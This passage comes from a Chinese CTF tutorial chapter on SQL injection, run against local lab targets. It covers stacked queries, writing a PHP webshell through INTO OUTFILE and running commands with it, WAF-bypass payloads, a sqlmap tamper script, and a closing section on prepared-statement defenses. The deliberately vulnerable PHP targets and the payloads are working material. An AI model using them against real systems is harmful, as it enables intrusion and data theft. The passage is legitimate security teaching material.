> 两件事决定时间盲注能不能用：**单次延时要比网络抖动大一个量级**（本节用 0.5 秒对亚毫秒抖动；打远程靶时先测基线往返再定 DELAY 和 THRESHOLD），以及**总请求量**（二分每字符 7 发，sleep 只在真分支触发，实际耗时约为请求数 × 延时 × 一半）。SQLite 没有原生延时函数，==时间盲注在 SQLite 靶上没有直接等价物==；社区有 `randomblob(大数)` 之类拖慢查询的构造，稳定性远不如 sleep，一般退回布尔盲注。

## 7. 堆叠注入

前面所有手法都只让输入"修改一条 SELECT"。堆叠（stacked）注入更进一步：==用分号把整条新语句接在原语句后面执行==，INSERT / UPDATE / 建表 / 写文件全部解锁。

### 7.1 什么条件能堆叠

堆叠是**客户端驱动能力**，不是 SQL 方言能力——MariaDB 服务端本来就接受分号分隔的多语句，问题是一次 HTTP 请求带来的那条字符串，代码层用什么 API 送进数据库：

| 接口 | 多语句 | 说明 |
| ---- | ---- | ---- |
| `mysqli::query()` | 否 | 只执行第一条 |
| `mysqli::multi_query()` | 是 | 逐个取结果集，堆叠靶用它 |
| PDO MySQL（默认，模拟预处理） | 是 | 第二条语句在服务端真实执行，但 PDO 只返回第一个结果集 |
| PDO MySQL（`ATTR_EMULATE_PREPARES => false`） | 否 | 原生预处理直接报语法错误 |
| PDO SQLite `exec()` | 是 | 多语句都执行 |
| PDO SQLite `query()` | 否 | 只执行第一条，后续静默丢弃 |
| `SQLite3::exec()` | 是 | 多语句都执行 |
| `SQLite3::query()` | 是（不报错） | 后续语句也执行，但只返回第一个结果集 |

MySQL 侧的探测脚本与输出（CLI 直接跑）：

```php
<?php
// pdo_probe.php —— 各接口对多语句的支持
$m = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'dev', 'dev_pass');
printf("PDO mysql ATTR_EMULATE_PREPARES 默认值: %s\n",
    var_export($m->getAttribute(PDO::ATTR_EMULATE_PREPARES), true));
$st = $m->query('SELECT 99;SELECT 98');
echo "首结果集: ", json_encode($st->fetchAll(PDO::FETCH_NUM)), "\n";
$n = 0;
while ($st->nextRowset()) { $n++; }
echo "额外结果集个数: $n\n";

$m2 = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'dev', 'dev_pass',
    [PDO::ATTR_EMULATE_PREPARES => false]);
try {
    $m2->query('SELECT 99;SELECT 98');
} catch (Throwable $e) {
    echo "emulate=off: ", $e->getMessage(), "\n";
}
```

输出：

```
PDO mysql ATTR_EMULATE_PREPARES 默认值: true
首结果集: [[99]]
额外结果集个数: 1
emulate=off: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT 98' at line 1
```

==很多老资料说"PDO 不能堆叠"，指的是关闭模拟预处理的那半边；默认配置（模拟预处理）下 PDO MySQL 是能堆叠的==。审代码时看到 PDO 不用急着排除堆叠，先看有没有显式关掉 `ATTR_EMULATE_PREPARES`。

### 7.2 堆叠靶上走一遍

堆叠靶（8406，`target_stack.php`）改用 `mysqli_multi_query`，参数是数字上下文（不套引号），并逐个打印所有结果集。启动它，另外建一个 `webroot/` 目录当 Web 根——里面放一个 `flag.txt` 当靶标，用普通方式起服务，7.3 节写进去的文件要靠它访问：

```bash
php -S 127.0.0.1:8406 target_stack.php &
mkdir webroot && echo 'flag{1nt0_0utf1l3_g3tsh3ll}' > webroot/flag.txt
php -S 127.0.0.1:8407 -t webroot &
```

```php
<?php
// target_stack.php —— mysqli_multi_query 执行整串 SQL，打印每个结果集
ini_set('display_errors', '1');
error_reporting(E_ALL);
header('Content-Type: text/plain; charset=utf-8');

$id = $_GET['id'] ?? '1';
$conn = mysqli_connect('127.0.0.1', 'dev', 'dev_pass', 'ctf');
if (!$conn) {
    echo '[ERROR] ', mysqli_connect_error(), "\n";
    exit;
}

$sql = "SELECT id, username, password FROM users WHERE id = $id";
echo "[SQL] $sql\n";
if (mysqli_multi_query($conn, $sql)) {
    do {
        if ($res = mysqli_store_result($conn)) {
            while ($row = mysqli_fetch_row($res)) {
                echo implode(' | ', $row), "\n";
            }
            mysqli_free_result($res);
        } elseif (mysqli_error($conn) !== '') {
            echo '[SQLERR] ', mysqli_error($conn), "\n";
        }
        if (mysqli_more_results($conn)) {
            echo "---- 下一个结果集 ----\n";
        }
    } while (mysqli_next_result($conn));
} else {
    echo '[SQLERR] ', mysqli_error($conn), "\n";
}
mysqli_close($conn);
```

基线，然后堆叠一条 INSERT：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=1"
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=1;insert%20into%20users(username,password)%20values('pwn3d','st4ck3d')"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = 1
1 | admin | s3cr3t_pw
[SQL] SELECT id, username, password FROM users WHERE id = 1;insert into users(username,password) values('pwn3d','st4ck3d')
1 | admin | s3cr3t_pw
---- 下一个结果集 ----
```

再查 id=4，确认插入已经落库；接着建表、写数据、查询一气呵成：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=4"
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=-1;create%20table%20pwn(t%20varchar(100));insert%20into%20pwn%20values('stacked%20ok');select%20*%20from%20pwn"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = 4
4 | pwn3d | st4ck3d
[SQL] SELECT id, username, password FROM users WHERE id = -1;create table pwn(t varchar(100));insert into pwn values('stacked ok');select * from pwn
---- 下一个结果集 ----
---- 下一个结果集 ----
---- 下一个结果集 ----
stacked ok
```

第 1 条 SELECT 因为 `id=-1` 返回一个空结果集，中间的 CREATE / INSERT 不产生结果集，第 4 条 SELECT 的 `stacked ok` 被打印出来。==堆叠注入把注入面从"读"扩成"写"==——改数据、建后门表、改账号权限都在射程内：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=1;select%20flag%20from%20secret.flags"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = 1;select flag from secret.flags
1 | admin | s3cr3t_pw
---- 下一个结果集 ----
flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t}
```

> [!warning] 回显型靶打不了"有副作用"的堆叠不代表服务端没执行
> 本章 8401 靶的 PDO 是默认配置，堆叠语句同样会送进服务端执行，只是页面只显示第一个结果集——你看到的"没反应"可能只是"结果没显示"。验证服务端是否执行，用有副作用的语句（INSERT 后再查计数）。

### 7.3 INTO OUTFILE 写文件

堆叠 + 高权限账号的下一步是写文件：`SELECT ... INTO OUTFILE '路径'` 把查询结果落成服务端上的文件。两个前置条件：

1. **`secure_file_priv` 不挡路**。这个系统变量限制读写路径：设为目录则只能写该目录，设为 `NULL` 则完全禁用，==为空字符串时不限制==；
2. **数据库进程对目标目录有写权限，且账号有 FILE 权限**（`dev` 的 `ALL PRIVILEGES` 包含它，只读的 `ctf` 没有）。

检查命令：

```bash
mariadb --user root -e "SHOW VARIABLES LIKE 'secure_file_priv';"
```

输出：

```
Variable_name	Value
secure_file_priv	
```

值为空——不限制。把一行 PHP 写进 8407 端口服务的 `webroot/` 目录：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8406/?id=-1;select%20'%3C%3Fphp%20echo%20shell_exec(%24_GET%5B0%5D);'%20into%20outfile%20'/mnt/c/Users/28443/AppData/Local/Temp/ctf_verify/w04/webroot/sh.php'"
```

URL 里的编码逐个还原：`%3C%3Fphp` = `<?php`，`%24` = `$`，`%5B0%5D` = `[0]`。`[ ]` 必须编码——curl 会把裸的 `[...]` 当作 URL 通配符展开，导致请求根本发不出去。查看落盘文件：

```bash
ls -l webroot/
```

输出：

```
total 0
-rwxrwxrwx 1 hua hua 28 Oct 23 18:36 flag.txt
-rwxrwxrwx 1 hua hua 33 Oct 23 18:47 sh.php
```

文件内容是一句话 shell（webshell）：`<?php echo shell_exec($_GET[0]);`。8407 端口起的正是这个目录的 PHP 服务，访问它执行任意命令：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8407/sh.php?0=id;cat%20flag.txt'
```

输出：

```
uid=0(root) gid=0(root) groups=0(root)
flag{1nt0_0utf1l3_g3tsh3ll}
```

==SQL 注入到 getshell 的完整链路：注入点 → 堆叠执行 → INTO OUTFILE 写 shell → 访问 shell 执行命令==。这条链每一环都对应一个前置条件（堆叠可用、FILE 权限、secure_file_priv 放行、目录可写、写进 Web 可访问目录），实战里缺任何一环就换路线。扩展名被拦时，写出的文件也可以配合文件包含执行（[[W06-文件包含|W06]]）；命令执行的更多姿势在 [[W05-命令注入与代码执行|W05]]。

## 8. WAF 基础绕过

真实目标常有黑名单过滤：把 `union`、`select` 这类关键字删掉或拦下。绕过的通用思路只有两条：==让关键字以过滤器认不出的形状通过==，以及==让被过滤的字符（空格、引号）有替代品==。本节在一个可调级别的 WAF 靶上逐条走。

### 8.1 WAF 靶

`target_waf.php`（端口 8405），参数是数字上下文（`id` 不套引号），`level` 参数控制过滤强度，级别越高拦得越多：

```php
<?php
// target_waf.php —— 黑名单 WAF 靶：level 越高过滤越紧，过滤后打印实际执行的 SQL
ini_set('display_errors', '1');
error_reporting(E_ALL);
header('Content-Type: text/plain; charset=utf-8');

$id    = $_GET['id'] ?? '1';
$level = (int)($_GET['level'] ?? 1);

function waf(string $s, int $level): string
{
    // 关键字过滤每级只应用一次：第一遍删除会把 uniunionon 还原成 union，
    // 紧接着再来一遍就把还原出的 union 也删掉了，双写绕过会失效
    if ($level == 1) {
        $s = str_replace('union', '', $s);               // 1 拦 union（区分大小写）
    } elseif ($level >= 2) {
        $s = str_ireplace(['union', 'select'], '', $s);  // 2 起关键字全拦（不区分大小写）
    }
    if ($level >= 3) $s = str_replace(' ', '', $s);      // 3 拦空格
    if ($level >= 4) $s = str_ireplace(['and', 'or'], '', $s);  // 4 拦 and/or
    if ($level >= 5) $s = str_replace(["'", '"'], '', $s);      // 5 拦引号
    return $s;
}

$filtered = waf($id, $level);
echo "[WAF level $level] 过滤后: $filtered\n";
try {
    $pdo = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'ctf', 'ctf_pass', [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    ]);
    $sql = "SELECT id, username, password FROM users WHERE id = $filtered";
    foreach ($pdo->query($sql) as $row) {
        echo $row['id'], ' | ', $row['username'], ' | ', $row['password'], "\n";
    }
} catch (Throwable $e) {
    echo "[ERROR] ", $e->getMessage(), "\n";
}
```

启动：`php -S 127.0.0.1:8405 target_waf.php &`。注意靶子是数字上下文（`id = $filtered` 不套引号），所以 level 5 的"拦引号"只会拦掉 payload 里试图使用的引号，不会像回显靶那样被引号闭合卡住。

### 8.2 五级绕过逐条走

**Level 1：拦小写 `union`。** 直接注入被删成坏 SQL：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%20union%20select%201,2,3&level=1"
```

输出：

```
[WAF level 1] 过滤后: -1  select 1,2,3
[ERROR] SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select 1,2,3' at line 1
```

`union` 被删。它只匹配小写——换大小写：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%20UNION%20select%201,2,3&level=1"
```

输出：

```
[WAF level 1] 过滤后: -1 UNION select 1,2,3
1 | 2 | 3
```

**Level 2：大小写不敏感拦 `union`/`select`。** 换大小写失效：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%20UNION%20select%201,2,3&level=2"
```

输出：

```
[WAF level 2] 过滤后: -1   1,2,3
[ERROR] SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1,2,3' at line 1
```

"删除式"过滤是**只扫一遍**的：把关键字写成双写 `uniunionon`，第一遍删除命中的是中间那份，剩下两头正好拼回 `union`：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%20uniunionon%20selselectect%201,2,3&level=2"
```

输出：

```
[WAF level 2] 过滤后: -1 union select 1,2,3
1 | 2 | 3
```

==双写只对"删除一遍"型过滤有效==；换成"命中即拒绝"型（正则匹配直接 403）就得回到换大小写、版本注释这些不改变关键字本体的手法。

**Level 3：再拦空格。** 空格一删，双写拼出来的关键字连在一起成坏 SQL：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%20uniunionon%20selselectect%201,2,3&level=3"
```

输出：

```
[WAF level 3] 过滤后: -1unionselect1,2,3
[ERROR] SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '2,3' at line 1
```

空格的替代品：`/**/` 注释在 MySQL 词法里就是分隔符；URL 编码的 `%09`（Tab）和 `%0a`（换行）不在"空格"的匹配范围里，但同样是合法分隔符：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1/**/uniunionon/**/selselectect/**/1,2,3&level=3"
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1%09uniunionon%09selselectect%091,2,3&level=3"
```

输出：

```
[WAF level 3] 过滤后: -1/**/union/**/select/**/1,2,3
1 | 2 | 3
[WAF level 3] 过滤后: -1	union	select	1,2,3
1 | 2 | 3
```

**Level 4：再拦 `and`/`or`。** 这一级有两个经典坑。第一，逻辑与或可以直接用运算符替身：`&&` 等价 `and`、`||` 等价 `or`（URL 里 `&` 要写 `%26`）：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=1%20and%201=1&level=4"
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=1%26%261%3D1&level=4"
```

输出：

```
[WAF level 4] 过滤后: 11=1
[WAF level 4] 过滤后: 1&&1=1
1 | admin | s3cr3t_pw
```

第一条的 `and` 被删后条件拼成 `11=1`，一行数据都回不来；第二条正常返回。第二，`and`/`or` 是高频字母组合，删除式过滤会==误伤包含它们的单词==——`information_schema`、`password`、`order` 全部中招。解法还是双写：`passwoorrd` 被删一次后变回 `password`：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1/**/uniunionon/**/selselectect/**/1,2,passwoorrd/**/from/**/users&level=4"
```

输出：

```
[WAF level 4] 过滤后: -1/**/union/**/select/**/1,2,password/**/from/**/users
1 | 2 | s3cr3t_pw
1 | 2 | guest123
1 | 2 | w0nd3rl4nd
```

**Level 5：再拦引号。** 字符串常量还有无引号写法——十六进制字面量。`0x61646d696e` 就是 `'admin'`（对照 6.2 节的换算）：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8405/?id=-1/**/uniunionon/**/selselectect/**/1,2,concat(username,0x3a,passwoorrd)/**/from/**/users/**/where/**/username=0x61646d696e&level=5"
```

输出：

```
[WAF level 5] 过滤后: -1/**/union/**/select/**/1,2,concat(username,0x3a,password)/**/from/**/users/**/where/**/username=0x61646d696e
1 | 2 | admin:s3cr3t_pw
```

> [!info]- 版本注释：只在部分过滤器面前有用
> MariaDB 对 `/*!50000 内容 */` 有特殊处理：版本号大于等于 50000 时**执行**注释里的内容，等于给关键字套了一层很多过滤器认不出的壳。两个形式都合法：
>
> ```bash
> mariadb -u ctf -pctf_pass ctf -e "SELECT 1 UNION /*!50000 SELECT */ 2;"
> mariadb -u ctf -pctf_pass ctf -e "SELECT 1 UNION/*!50000SELECT*/2;"
> ```
>
> 输出：
>
> ```
> 1
> 1
> 2
> 1
> 1
> 2
> ```
>
> 它对付的是"把注释整体剥掉再检查"或"按注释边界匹配"的检测；对 8.1 节这种直接扫关键字的删除式过滤**无效**——`/*!50000select*/` 里的 `select` 一样会被删掉。选哪招，取决于过滤器是哪种。

> [!warning] 绕过手法必须和过滤级别配套
> 8.2 节的 `or→oorr` 双写假定了"and/or 过滤开着"这个前提。假如 WAF 还没开到那一级，双写残留在语句里（`INFoorrMATION_SCHEMA`），表名直接不存在——9.4 节的 sqlmap tamper 就会撞上这个坑。打靶时先用单发 payload 摸清过滤器删什么、不删什么，再拼完整绕过。

## 9. sqlmap

[[11-Web安全版图与Burp#5. 打题流程：拿到题先看什么|11 章 第 5 节]]的警告在这里展开：==sqlmap 是放大器不是探测器==。注入点存在与否、哪种类型、回显在哪，得先手工判断——前三节的全部手法就是判断依据。工具的价值是在确认之后，把"发几百发请求拖一个库"的重复劳动接管掉。

### 9.1 确认注入

```bash
sqlmap -u "http://127.0.0.1:8401/?id=1" --batch --dbs
```

`-u` 给目标 URL，`--batch` 对所有交互问题选默认值。输出（节选）：

```
[18:48:23] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:48:23] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[18:48:23] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
[18:48:33] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[18:48:43] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:48:43] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9672=9672 AND 'gYGN'='gYGN
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(6955,CONCAT(0x5c,0x71766a6271,(SELECT (ELT(6955=6955,1))),0x7171627671)) AND 'uGTJ'='uGTJ
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1';SELECT SLEEP(5)#
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3377 FROM (SELECT(SLEEP(5)))xYtE) AND 'OBzf'='OBzf
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a6271,0x5246656449504d6150414b78676556744b58557975566b415a51786a6a617471575477486d557946,0x7171627671),NULL,NULL-- -
[18:48:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
available databases [3]:
[*] ctf
[*] information_schema
[*] secret
```

五种注入类型全部识别，每种给出一个可重放的 Payload——这些 payload 就是 3–7 节手法的模板库。`--dbs` 列出全部库，与 3.3 节手工的 `schemata` 结果一致。

### 9.2 拖表与拖数据

```bash
sqlmap -u "http://127.0.0.1:8401/?id=1" --batch -D secret --tables
```

输出（节选）：

```
Database: secret
[1 table]
+-------+
| flags |
+-------+
```

```bash
sqlmap -u "http://127.0.0.1:8401/?id=1" --batch -D secret -T flags --dump
```

输出（节选）：

```
Table: flags
[1 entry]
+----+---------------------------------------------------+
| id | flag                                              |
+----+---------------------------------------------------+
| 1  | flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t} |
+----+---------------------------------------------------+
```

参数与 3.3 节的手工链一一对应：`-D` 选库（dbs）、`--tables` 拖表、`-T` 选表、`--dump` 拖数据。数据同时落成 CSV 文件，路径在输出末尾。

### 9.3 常用选项

| 选项 | 干什么 | 什么时候用 |
| ---- | ---- | ---- |
| `-p 参数` | 只测指定参数 | 参数多时省时间；cookie/头里的参数要 `--level` 配合 |
| `--level=N` `--risk=N` | 测试广度（1–5）与激进度（1–3） | 默认测不到的注入点（cookie、UA、OR 型）逐级加火力 |
| `--technique=BEUSTQ` | 限定注入类型 | 页面有 WAF 时逐类型试错；B 布尔 E 报错 U 联合 S 堆叠 T 时间 Q 内联 |
| `--dbms=mysql` | 指定后端数据库 | 手工已认出数据库时，跳过无关 payload 加速 |
| `--data="a=b"` | POST 数据 | 登录框这类 POST 参数 |
| `--cookie="k=v"` | 带会话 | 目标要登录才可达时 |
| `--tamper=脚本` | 调用篡改脚本改写 payload | 有过滤时，见 9.4 |
| `--flush-session` | 清掉本地缓存的结果 | 反复打同一目标时避免读到旧结论 |

打盲注靶（8403）时 sqlmap 走的是布尔/时间手法，页面只有两态也能拖完数据，只是速度受请求数限制——和 5、6 节的手工脚本同一数学，只是它把工程细节（并发、去噪、断点续拖）都做了。

### 9.4 tamper：把绕过手法写进脚本

WAF 靶开到 level 4，先看不带 tamper 的结果：

```bash
sqlmap -u "http://127.0.0.1:8405/?id=1&level=4" --batch --flush-session
```

输出（节选）：

```
[19:00:08] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[19:00:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
……
[19:00:15] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[19:00:15] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[19:00:16] [INFO] the back-end DBMS is MySQL
```

从布尔到 100 列 UNION 把内置 payload 全试了一遍，没有任何一条被确认——payload 里的小写 `union`/`select` 全被 WAF 删掉，发出去的都是坏 SQL。

tamper 脚本是 sqlmap 的 payload 改写钩子：每个脚本一个 `tamper(payload)` 函数，返回改写后的 payload。把 8.2 节的绕过写进去：

```python
#!/usr/bin/env python
# tamper_waf.py —— 关键字双写穿过删除式过滤，空格换成 Tab
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL


def dependencies():
    pass


def tamper(payload, **kwargs):
    payload = re.sub(r'union', 'uniunionon', payload, flags=re.I)
    payload = re.sub(r'select', 'selselectect', payload, flags=re.I)
    payload = re.sub(r'and', 'aandnd', payload, flags=re.I)
    payload = re.sub(r'or', 'oorr', payload, flags=re.I)
    return payload.replace(' ', '\t')
```

用上它再打（`--tamper` 给脚本路径，脚本所在目录里要有一个空的 `__init__.py`，否则 sqlmap 拒绝加载）：

```bash
sqlmap -u "http://127.0.0.1:8405/?id=1&level=4" --batch --dbs --flush-session \
       --tamper=tamper_waf.py
```

输出（节选）：

```
[18:59:24] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[18:59:24] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
[18:59:34] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[18:59:44] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:59:44] [INFO] target URL appears to be UNION injectable with 3 columns
[18:59:44] [INFO] GET parameter 'id' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
available databases [3]:
[*] ctf
[*] information_schema
[*] secret
```

五类注入全部识别，三个库照常拖出。tamper 不是魔法：==它只是把第 8 节的手法自动化==。两条使用要点：

- **手法要和过滤级别配套**。把上面这条命令的 `level=4` 改成 `level=3`（and/or 过滤未开），双写残留没人还原，`INFoorrMATION_SCHEMA` 这种表名直接不存在，枚举全部失败——先摸清过滤器，再写 tamper；
- **写 tamper 前先用单发 payload 在 Repeater 里试一遍**（[[11-Web安全版图与Burp#2.1 Burp Suite：中间人本尊|11 章 第 2 节]]的工作循环），确认每一级过滤的实际行为，比反复跑 sqlmap 快得多。

## 10. 防御

SQL 注入的根因只有一个：==数据被拼进了代码==。对应的核心防御只有一个：预处理（参数化查询）。

**PDO 预处理**：SQL 模板与数据分两次交付，数据库先编译模板，再把数据当纯数据绑定进来，输入永远没有变成 SQL 语法的通道。把靶一改成安全版（`target_safe.php`），启动后重放攻击：

```bash
php -S 127.0.0.1:8408 target_safe.php &
```

```php
<?php
// target_safe.php —— PDO 预处理版本：输入永远只是数据
ini_set('display_errors', '1');
header('Content-Type: text/plain; charset=utf-8');

$id = $_GET['id'] ?? '1';
$pdo = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'ctf', 'ctf_pass', [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
]);

echo "[SQL 模板] SELECT id, username, password FROM users WHERE id = ?\n";
echo "[参数] $id\n";

$stmt = $pdo->prepare('SELECT id, username, password FROM users WHERE id = ?');
$stmt->execute([$id]);
foreach ($stmt as $row) {
    echo $row['id'], ' | ', $row['username'], ' | ', $row['password'], "\n";
}
```

对它重放本章的全部攻击：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8408/?id=1"
curl -s --noproxy '*' "http://127.0.0.1:8408/?id=1'%20or%201=1--%20"
curl -s --noproxy '*' "http://127.0.0.1:8408/?id=-1'%20union%20select%201,2,flag%20from%20secret.flags--%20"
```

输出：

```
[SQL 模板] SELECT id, username, password FROM users WHERE id = ?
[参数] 1
1 | admin | s3cr3t_pw
[SQL 模板] SELECT id, username, password FROM users WHERE id = ?
[参数] 1' or 1=1-- 
1 | admin | s3cr3t_pw
[SQL 模板] SELECT id, username, password FROM users WHERE id = ?
[参数] -1' union select 1,2,flag from secret.flags-- 
```

第一发返回 id=1 的行（不是全表），后两发一行都拿不到——payload 被当成一个字符串去和 id 比较了。`?` 是位置占位符（`execute` 按顺序给值）；命名占位符 `:id` 配 `execute([':id' => $id])` 同理。

预处理之外的第三道常规工事，各一句：

- **最小权限账号**。本章建库时给了两个账号：`ctf` 只有 SELECT，`dev` 全权——第 7 节能写文件、能堆叠建表的都是 `dev`。业务代码连只读账号，注入能走的路就少一半；
- **关掉错误显示**。报错注入的前提是错误消息上页面（4.1 节）。生产环境 `display_errors=off`、错误进日志。错误消息同样是信息泄露的入口，[[W03-信息泄露与前端安全|W03]] 展开这一面。

> [!note] 黑名单过滤不算防御
> 第 8 节的全部绕过说明：关键字黑名单挡得住脚本小子，挡不住知道"双写、Tab、hex 字面量"的人。SQL 层的正解就是预处理，把"数据永远不当代码"变成结构保证；黑名单至多是纵深防御里的补充层。

## 11. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| union 报 `different number of columns` | 列数没对上。用 `order by N` 二分确定原查询列数，UNION 的列数与之相同 |
| `order by` 判断列数时报的不是列错误而是语法错误 | 引号没闭合，后面的内容全乱了。先用 `1' and 1=1-- ` 与 `1' and 1=2-- ` 对照确认闭合 |
| payload 正确但页面毫无变化 | 看页面是不是真的把参数拼进了 SQL：换一个必然报错的引号，响应没变说明参数没进查询或被强转成整数 |
| `#` 注释没生效 | URL 里 `#` 是锚点，根本不会发给服务器，写 `%23` |
| `-- ` 注释没生效 | 横线后的空格丢了：浏览器里要写 `--%20` 或 `--+`；空格丢了会被当成两个减号（1.3 节） |
| extractvalue 只带出一半数据 | 错误消息约 32 字符截断。`substr(子查询, 起点, 长度)` 挪窗口分段读，段间留重叠防漏（4.2 节） |
| SQLite 靶上 extractvalue / sleep 全部报函数不存在 | 方言差异：这两个函数是 MySQL/MariaDB 的。SQLite 走联合查询或布尔盲注（1.5 节方言表） |
| 盲注脚本拖出的字符不对或中途断掉 | 字符集没覆盖（flag 里的 `}`、`_` 是否在范围内）或网络抖动让真/假判断翻转。时间盲注先测基线耗时，每个判断可重复采样取多数 |
| sqlmap 报 302 重定向或要登录 | 目标把未认证请求跳到登录页。`--cookie` 带会话重抓，或 `--random-agent` 换 UA；先确认手工请求能拿到注入点的页面 |
| sqlmap 说参数不可注入 | 先手工确认 payload 能改变响应；再逐级 `--level`/`--risk`、`-p` 指定参数、`--dbms` 收窄测试面。确定有注入而 sqlmap 测不出，多半是过滤把它的 payload 改写了——写 tamper（9.4 节） |
| sqlmap 加载 tamper 报 `make sure that there is an empty file '__init__.py'` | sqlmap 要求 tamper 脚本所在目录是个包：在脚本同目录放一个空 `__init__.py` |
| tamper 过了检测但枚举全失败 | 绕过手法与过滤级别不配套：双写依赖对应的删除过滤开着（8.2 节末的 warning）。先用单发 payload 摸清过滤器行为 |
| `INTO OUTFILE` 报 `Can't create/write to file` | 三查：`SHOW VARIABLES LIKE 'secure_file_priv'` 是否限定了目录；数据库进程对目标目录有无写权限；账号有无 FILE 权限 |
| 带方括号的 payload 发不出请求 | curl 把裸 `[...]` 当 URL 通配展开。方括号写 `%5B` / `%5D`（7.3 节） |
| PDO 代码按老资料"不能堆叠"排除了堆叠，堆叠却发生了 | PDO MySQL 默认开模拟预处理，默认配置可以堆叠；只有显式 `ATTR_EMULATE_PREPARES => false` 才禁掉（7.1 节） |
| MariaDB 服务起不来 | WSL 里 `sudo service mariadb start`；仍失败看 `/var/log/mysql/error.log`，多为数据目录权限或端口占用 |

## 12. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **完整复现**：按第 2 节从零搭起全部靶场，把 3–8 节的每一条命令亲手打一遍，要求不看正文说出每发 payload 在做什么。
> 2. **改脚本**：把 `blind_bool.py` 的目标换成 8404（SQLite 盲注靶）拖出 flags 表的 flag（注意子查询里没有 `secret.` 前缀）；再给脚本加"每发请求重试两次取多数"的降噪逻辑。
> 3. **升级 WAF**：给 WAF 靶加 level 6——同时删掉 Tab 和 `/**/`。用单发 payload 摸清新过滤器的行为，再决定 `%0a`、括号包裹还是别的分隔思路，把绕过写进 tamper 跑通 `--dbs`。
> 4. **sqli-labs 通关**：[[11-Web安全版图与Burp#5. 打题流程：拿到题先看什么|11 章 第 5 节]]的靶场清单里 sqli-labs Less-1 到 Less-37，按"先手工、后 sqlmap"过掉前 20 关（[[13-Docker与赛题环境|13 章]]的 docker 直接拉起）。
> 5. **审计视角**：回头读 11 章的九类漏洞表，标出哪些类型（上传、SSRF、反序列化）能和 SQL 注入组成利用链，写出每条链的前置条件。

配套练习之外，按主题归档的延伸材料：

